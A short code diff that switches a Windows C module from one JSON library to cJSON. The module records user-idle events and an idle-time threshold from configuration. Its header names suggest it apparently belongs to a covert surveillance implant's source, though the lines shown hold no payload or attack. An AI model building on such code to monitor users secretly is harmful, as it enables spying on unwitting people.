@@ -1,5 +1,5 @@
 #include <Windows.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include "../common.h"
 #include "../bss.h"
 #include "../H4-DLL.h"
@@ -70,7 +70,7 @@ DWORD MonitorUserIdles(DWORD dummy)
 }
 
 
-void WINAPI EM_UserIdlesAdd(JSONObject conf_json, EVENT_PARAM* event_param, DWORD event_id)
+void WINAPI EM_UserIdlesAdd(cJSON *conf_json, EVENT_PARAM* event_param, DWORD event_id)
 {
 	void* temp_table;
 
@@ -80,7 +80,7 @@ void WINAPI EM_UserIdlesAdd(JSONObject conf_json, EVENT_PARAM* event_param, DWOR
 	user_idles_table = (monitored_user_idles*)temp_table;
 	memcpy(&user_idles_table[user_idles_count].event_param, event_param, sizeof(EVENT_PARAM));
 	user_idles_table[user_idles_count].event_id = event_id;
-	user_idles_table[user_idles_count].threshold = conf_json[L"time"]->AsNumber();
+	user_idles_table[user_idles_count].threshold = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "time"));
 
 	user_idles_count++;
 }
